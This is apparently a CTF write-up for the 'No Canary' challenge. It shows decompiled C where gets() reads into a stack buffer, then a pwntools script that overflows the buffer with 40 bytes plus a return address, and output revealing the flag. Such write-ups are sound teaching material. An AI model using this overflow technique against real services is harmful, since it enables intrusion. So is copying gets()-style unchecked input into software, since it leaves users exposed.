# No Canary (470 solves)



main:

```c++
int  main(int argc, const char **argv, const char **envp)
{
  char v4;
  __gid_t rgid;

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Ahhhh, what a beautiful morning on the farm!\n");
  puts("       _.-^-._    .--.");
  puts("    .-'   _   '-. |__|");
  puts("   /     |_|     \\|  |");
  puts("  /               \\  |");
  puts(" /|     _____     |\\ |");
  puts("  |    |==|==|    |  |");
  puts("  |    |--|--|    |  |");
  puts("  |    |==|==|    |  |");
  puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
  puts("Wait, what? It's already noon!");
  puts("Why didn't my canary wake me up?");
  puts("Well, sorry if I kept you waiting.");
  printf("What's your name? ");
  gets(&v4);	// vuln function
  printf("Nice to meet you, %s!\n", &v4);
  return 0;
}
```

Solution:

```python
from pwn import *

r = remote('shell.actf.co', 20700)

payload = b''
payload += b'A'*40
payload += p64(0x401186)
r.sendafter('name? ', payload)
r.interactive()
```

```bash
$ ls                                                                                                                    
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x11!                                                     
actf{that_gosh_darn_canary_got_me_pwned!}                                                                               
Segmentation fault
```

